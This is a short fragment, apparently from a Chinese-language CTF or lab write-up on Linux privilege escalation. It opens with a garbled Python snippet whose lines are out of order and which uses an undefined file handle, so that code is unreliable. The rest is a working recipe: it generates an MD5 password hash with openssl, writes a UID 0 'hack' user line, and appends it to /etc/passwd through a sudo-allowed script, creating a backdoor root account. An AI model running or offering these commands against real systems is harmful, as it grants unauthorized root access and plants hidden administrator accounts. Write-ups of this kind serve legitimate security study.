import sys

if len (sys.argv) != 3 :

    sys.exit (1)

    output = (f.read())

    f = open(sys.argv[2], "a")

直接就想到了创建一个root权限的用户实现登录！

### 创建root用户添加进/etc/passwd

#### 创建用户

```bash
openssl passwd -1 -salt hack hack
# $1$hack$xR6zsfvpez/t8teGRRSNr.
echo 'hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/bin/bash' > /tmp/hack
sudo ./test /tmp/hack /etc/passwd
cat /etc/passwd
```
